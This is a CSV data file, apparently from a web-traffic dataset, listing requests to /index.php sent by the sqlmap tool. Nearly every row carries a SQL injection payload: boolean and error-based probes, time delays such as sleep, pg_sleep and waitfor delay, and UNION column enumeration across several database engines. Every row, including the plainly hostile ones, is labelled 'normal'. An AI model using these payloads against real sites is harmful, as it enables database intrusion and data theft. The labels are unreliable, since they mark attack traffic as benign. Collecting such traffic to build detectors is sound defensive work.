/,,*/* close,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113))) and ('uney'='uney,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113))) and 'myrh'='myrh,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113))) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113))) and (7343=7343,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113))),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9616 in (select (char(113) char(98) char(98) char(106) char(113) (select (case when (9616=9616) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113)))-- rbqi,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual) and ('lukz'='lukz,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual) and 'icpe'='icpe,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual) and (5957=5957,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 7488=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(98)||chr(98)||chr(106)||chr(113)||(select (case when (7488=7488) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(113)||chr(107)||chr(113)||chr(62))) from dual)-- yvpq,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","(select 7493 from(select count(*),concat(0x7162626a71,(select (elt(7493=7493,1))),0x7178716b71,floor(rand(0)*2))x from information_schema.plugins group by x)a)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","(select concat(0x7162626a71,(select (elt(4526=4526,1))),0x7178716b71))",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (chr(113)||chr(98)||chr(98)||chr(106)||chr(113))||(select (case when (9538=9538) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(113)||chr(107)||chr(113))),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select char(113) char(98) char(98) char(106) char(113) (select (case when (8840=8840) then char(49) else char(48) end)) char(113) char(120) char(113) char(107) char(113)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and sleep(5) and ('mbrd'='mbrd,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and sleep(5) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and sleep(5)-- fprb,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 2012=(select 2012 from pg_sleep(5)) and (4186=4186,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 2012=(select 2012 from pg_sleep(5))-- vsrz,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) waitfor delay '0:0:5' and (8620=8620,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs waitfor delay '0:0:5'-- eies,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' and 1145=dbms_pipe.receive_message(chr(72)||chr(112)||chr(116)||chr(117),5) and 'ntye'='ntye",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and 1145=dbms_pipe.receive_message(chr(72)||chr(112)||chr(116)||chr(117),5)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and 1145=dbms_pipe.receive_message(chr(72)||chr(112)||chr(116)||chr(117),5)-- przj",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') order by 1-- oxot,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') order by 11-- izew,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') union all select null-- gwtk,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null-- wbnw",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null,null-- xcmk",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null,null,null,null,null,null,null-- evsc",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' order by 11-- ikye,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null-- vywb",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null,null-- ntst",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null,null,null,null,null-- ffgl",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null,null,null,null,null,null-- rslt",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' order by 11-- fuob,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null-- mauy",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null,null-- qclr",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null,null,null,null,null,null-- sqqw",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) union all select null-- arit,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null-- nlzl",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null-- djxq",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null,null-- tjqi",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null,null,null,null,null,null,null-- xbmd",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs order by 1-- vacl,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs union all select null-- xxlq,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null-- sbhc",normal
